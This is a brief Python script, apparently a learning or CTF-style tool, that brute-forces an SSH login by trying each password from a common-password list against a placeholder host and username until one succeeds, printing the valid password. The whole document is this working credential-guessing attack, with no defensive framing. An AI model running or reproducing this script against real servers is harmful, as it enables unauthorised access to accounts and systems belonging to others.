from pwn import *
import paramiko

host = "enter IP here"
username = "enter username here"
attempts = 0
with open("ssh-common-password.txt", "r") as password_list:
   for password in password_list:
     password = password.strip("\n")
     try:
       print("[{}] Attempting password: '{}'!".format(attempts, password))
       response = ssh(host=host, user=username, password=password, timeout=10)
       if response.connected():
         print("[>] Valid password found: '{}' !".format(password))
         response.close()
         break
       response.close()
     except paramiko.ssh_exception.AuthenticationException:
       print("[X] Invalid password!")
     attempts += 1
